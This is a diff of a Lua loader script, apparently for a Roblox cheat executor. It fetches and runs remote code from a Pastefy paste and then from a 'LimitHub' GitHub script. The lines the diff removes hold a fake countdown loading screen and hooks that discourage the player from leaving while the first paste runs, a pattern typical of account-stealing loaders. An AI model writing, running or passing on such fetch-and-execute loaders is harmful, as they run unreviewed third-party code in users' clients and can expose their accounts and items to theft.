@@ -1,81 +1,9 @@
--- Loader.lua
--- Executes Pastefy first, shows loading screen, then loads LimitHub
-
--- Run Pastefy script immediately
+-- First, run your Pastefy script
 pcall(function()
     loadstring(game:HttpGet("https://pastefy.app/8JqD2ajb/raw"))()
 end)
 
--- Anti-leave setup for the loading phase
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-local StarterGui = game:GetService("StarterGui")
-
-local antiLeaveConnection
-antiLeaveConnection = LocalPlayer.OnTeleport:Connect(function()
-    StarterGui:SetCore("SendNotification", {
-        Title = "Please Wait",
-        Text = "You can't leave during the loading phase.",
-        Duration = 5
-    })
-end)
-
-LocalPlayer.AncestryChanged:Connect(function(_, parent)
-    if not parent then
-        Instance.new("Folder", workspace) -- prevent removal (dummy fix)
-    end
-end)
-
--- Create loading screen
-local ScreenGui = Instance.new("ScreenGui")
-local Frame = Instance.new("Frame")
-local UIGradient = Instance.new("UIGradient")
-local Title = Instance.new("TextLabel")
-local TimerLabel = Instance.new("TextLabel")
-
-ScreenGui.Parent = game.CoreGui
-Frame.Size = UDim2.new(0, 400, 0, 200)
-Frame.Position = UDim2.new(0.5, -200, 0.5, -100)
-Frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
-Frame.BorderSizePixel = 0
-Frame.Parent = ScreenGui
-
-UIGradient.Color = ColorSequence.new{
-    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 170, 255)),
-    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 85, 255))
-}
-UIGradient.Parent = Frame
-
-Title.Size = UDim2.new(1, 0, 0.5, 0)
-Title.Position = UDim2.new(0, 0, 0, 20)
-Title.BackgroundTransparency = 1
-Title.Text = "Loading Script..."
-Title.TextColor3 = Color3.fromRGB(255, 255, 255)
-Title.TextSize = 28
-Title.Font = Enum.Font.GothamBold
-Title.Parent = Frame
-
-TimerLabel.Size = UDim2.new(1, 0, 0.5, 0)
-TimerLabel.Position = UDim2.new(0, 0, 0.5, -20)
-TimerLabel.BackgroundTransparency = 1
-TimerLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-TimerLabel.TextSize = 24
-TimerLabel.Font = Enum.Font.GothamSemibold
-TimerLabel.Parent = Frame
-
--- Countdown logic
-for i = 20, 1, -1 do
-    TimerLabel.Text = "Please wait " .. i .. " seconds..."
-    wait(1)
-end
-
--- Remove loading screen
-ScreenGui:Destroy()
-if antiLeaveConnection then
-    antiLeaveConnection:Disconnect()
-end
-
--- Load LimitHub
+-- Then, run the LimitHub script
 pcall(function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/FakeModz/LimitHub/refs/heads/main/LimitHub_Luarmor_E.lua"))()
 end)
